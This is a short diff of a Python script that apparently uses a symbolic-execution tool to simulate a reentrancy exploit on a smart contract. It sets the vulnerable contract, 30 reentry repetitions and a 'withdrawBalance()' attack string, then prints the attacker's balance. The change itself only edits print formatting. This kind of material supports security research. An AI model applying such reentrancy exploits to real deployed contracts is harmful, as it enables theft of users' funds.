@@ -92,13 +92,10 @@ print "[+] Setup the exploit"
 exploit_account.set_vulnerable_contract(contract_account)
 exploit_account.set_reentry_reps(30)
 
-
-
-print "\t Setting attack string"
+print "[+] Setting attack string"
 #'\x9d\x15\xfd\x17'+pack_msb(32)+pack_msb(4)+'\x5f\xd8\xc7\x10',
 reentry_string = ABI.make_function_id('withdrawBalance()')
 exploit_account.set_reentry_attack_string(reentry_string)
-
 
 print "[+] Initial world state"
 print " attacker_account %x balance: %d"% (attacker_account, m.get_balance(attacker_account))
